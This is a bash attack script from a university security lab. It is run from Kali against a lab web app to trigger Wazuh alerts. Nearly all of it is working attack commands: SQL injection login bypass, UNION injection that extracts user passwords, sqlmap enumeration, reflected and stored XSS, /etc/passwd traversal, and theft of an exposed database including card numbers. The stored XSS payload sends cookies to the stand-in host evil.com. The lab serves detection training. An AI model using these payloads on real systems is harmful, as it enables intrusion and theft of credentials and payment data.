#!/bin/bash
# =============================================================================
# Attack Script 02: Web Application Attacks
# CIS 3353 Security Lab - Run from Kali container
# =============================================================================
# Demonstrates: SQL Injection, XSS, Directory Traversal
# Module: 2 (Attack Surfaces), 5 (Endpoint Vulnerabilities)
# Expected Wazuh alerts: SQLi (100100-100102), XSS (100110-100111),
#                        Traversal (100130), Scanner (100131)
# =============================================================================

TARGET="${TARGET_IP:-10.10.0.20}"
RESULTS="/root/results/exploits"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================="
echo "  PHASE 2: WEB APPLICATION ATTACKS"
echo "  Target: http://${TARGET}"
echo "  Time: $(date)"
echo "============================================="

mkdir -p ${RESULTS}

# -----------------------------------------------
# Attack 2.1: SQL Injection - Manual Tests
# -----------------------------------------------
echo ""
echo "[2.1] SQL Injection - Manual Tests"
echo "---"

echo "  [a] Testing login bypass with SQLi..."
curl -s -X POST "http://${TARGET}/api/login.php" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"anything"}' \
    | jq . | tee ${RESULTS}/sqli_login_bypass_${TIMESTAMP}.json
echo ""

echo "  [b] Testing UNION-based SQLi on search..."
curl -s "http://${TARGET}/api/search.php?q=' UNION SELECT id,username,password,email,role FROM users --" \
    | jq . | tee ${RESULTS}/sqli_union_${TIMESTAMP}.json
echo ""

# -----------------------------------------------
# Attack 2.2: SQL Injection - Automated (sqlmap)
# -----------------------------------------------
echo ""
echo "[2.2] SQL Injection - Automated (sqlmap)"
echo "---"
echo "  Running sqlmap against search endpoint..."
sqlmap -u "http://${TARGET}/api/search.php?q=coffee" \
    --batch --dbs --level=2 --risk=2 \
    --output-dir=${RESULTS}/sqlmap_${TIMESTAMP}/ 2>/dev/null
echo "  >> Results: ${RESULTS}/sqlmap_${TIMESTAMP}/"

# -----------------------------------------------
# Attack 2.3: Cross-Site Scripting (XSS)
# -----------------------------------------------
echo ""
echo "[2.3] Cross-Site Scripting (XSS)"
echo "---"

echo "  [a] Reflected XSS via search..."
curl -s "http://${TARGET}/api/search.php?q=<script>alert('XSS')</script>" \
    | jq . | tee ${RESULTS}/xss_reflected_${TIMESTAMP}.json
echo ""

echo "  [b] Stored XSS via comment..."
curl -s -X POST "http://${TARGET}/api/comment.php" \
    -H "Content-Type: application/json" \
    -d '{"name":"<img src=x onerror=alert(1)>","comment":"<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>"}' \
    | jq . | tee ${RESULTS}/xss_stored_${TIMESTAMP}.json
echo ""

# -----------------------------------------------
# Attack 2.4: Directory Traversal
# -----------------------------------------------
echo ""
echo "[2.4] Directory Traversal"
echo "---"
echo "  [a] Attempting path traversal..."
curl -s "http://${TARGET}/api/search.php?q=../../../../etc/passwd" \
    | tee ${RESULTS}/traversal_${TIMESTAMP}.json
echo ""

# -----------------------------------------------
# Attack 2.5: Data Exfiltration
# -----------------------------------------------
echo ""
echo "[2.5] Data Exfiltration"
echo "---"
echo "  [a] Accessing exposed database..."
curl -s "http://${TARGET}/data/coffeeshop.db" \
    -o ${RESULTS}/stolen_database_${TIMESTAMP}.db 2>/dev/null
if [ -f "${RESULTS}/stolen_database_${TIMESTAMP}.db" ]; then
    echo "  DATABASE STOLEN! Contents:"
    sqlite3 ${RESULTS}/stolen_database_${TIMESTAMP}.db "SELECT '  Users: ' || count(*) FROM users;" 2>/dev/null
    sqlite3 ${RESULTS}/stolen_database_${TIMESTAMP}.db "SELECT '  Orders: ' || count(*) FROM orders;" 2>/dev/null
    echo "  Card numbers exposed:"
    sqlite3 ${RESULTS}/stolen_database_${TIMESTAMP}.db "SELECT '    ' || card_number FROM orders;" 2>/dev/null
fi

echo "  [b] Accessing phpinfo..."
curl -s "http://${TARGET}/api/info.php" \
    -o ${RESULTS}/phpinfo_${TIMESTAMP}.html
echo "  >> Server info saved"

echo ""
echo "============================================="
echo "  WEB ATTACKS COMPLETE"
echo "  Results: ${RESULTS}/"
echo "  Check Wazuh for SQLi/XSS/exfiltration alerts"
echo "============================================="
